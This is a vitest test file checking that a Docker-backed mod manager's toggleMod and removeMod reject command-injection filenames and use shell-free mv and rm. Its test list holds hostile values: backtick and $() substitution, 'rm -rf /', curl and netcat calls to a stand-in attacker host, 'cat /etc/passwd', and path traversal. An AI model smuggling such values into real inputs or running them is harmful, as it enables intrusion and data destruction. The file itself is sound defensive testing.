import { describe, it, expect, vi, beforeEach } from 'vitest';

const execMock = vi.fn();
const startMock = vi.fn((_opts: unknown, cb: (err: Error | null, stream: null) => void) => cb(null, null));
const getContainerMock = vi.fn(() => ({
  exec: execMock
}));

vi.mock('$lib/docker/client', () => ({
  docker: () => ({ getContainer: getContainerMock })
}));

vi.mock('$lib/db', () => ({
  db: () => ({}),
  schema: {}
}));

import { toggleMod, removeMod } from './mods';

beforeEach(() => {
  execMock.mockReset();
  startMock.mockClear();
  getContainerMock.mockClear();
  execMock.mockResolvedValue({ start: startMock });
});

const INJECTION_FILENAMES = [
  'mod`whoami`.jar',
  'mod$(whoami).jar',
  'mod;rm -rf /.jar',
  'mod && curl evil.sh.jar',
  'mod|nc attacker 4444.jar',
  'mod with space.jar',
  '"; cat /etc/passwd; ".jar',
  '../escape.jar',
  'sub/dir.jar'
];

describe('toggleMod filename validation', () => {
  for (const bad of INJECTION_FILENAMES) {
    it(`rejects malicious filename ${JSON.stringify(bad)} without running any container command`, async () => {
      await expect(toggleMod('srv', bad, true)).rejects.toThrow();
      expect(execMock).not.toHaveBeenCalled();
    });
  }

  it('accepts a normal filename and issues a shell-free array-form mv', async () => {
    await toggleMod('srv', 'sodium.jar', true);
    expect(execMock).toHaveBeenCalledTimes(1);
    const cmd = execMock.mock.calls[0][0].Cmd as string[];
    expect(cmd[0]).toBe('mv');
    expect(cmd).not.toContain('sh');
    expect(cmd).not.toContain('-c');
    // os argumentos do mv são paths literais, não uma string de shell interpolada
    expect(cmd).toEqual(['mv', '-f', '/data/mods/sodium.jar.disabled', '/data/mods/sodium.jar']);
  });

  it('swallows mv failure (source missing) instead of rejecting', async () => {
    startMock.mockImplementationOnce((_opts, cb) => cb(new Error('no such file'), null));
    await expect(toggleMod('srv', 'sodium.jar', false)).resolves.toBeUndefined();
  });
});

describe('removeMod filename validation', () => {
  it('rejects backtick injection in filename', async () => {
    await expect(removeMod('srv', 'mod`whoami`.jar')).rejects.toThrow();
    expect(execMock).not.toHaveBeenCalled();
  });

  it('rejects non-jar extension', async () => {
    await expect(removeMod('srv', 'evil.sh')).rejects.toThrow('filename inválido');
    expect(execMock).not.toHaveBeenCalled();
  });

  it('runs shell-free rm for a valid filename', async () => {
    await removeMod('srv', 'sodium.jar');
    expect(execMock).toHaveBeenCalledTimes(1);
    const cmd = execMock.mock.calls[0][0].Cmd as string[];
    expect(cmd[0]).toBe('rm');
    expect(cmd).not.toContain('sh');
  });
});
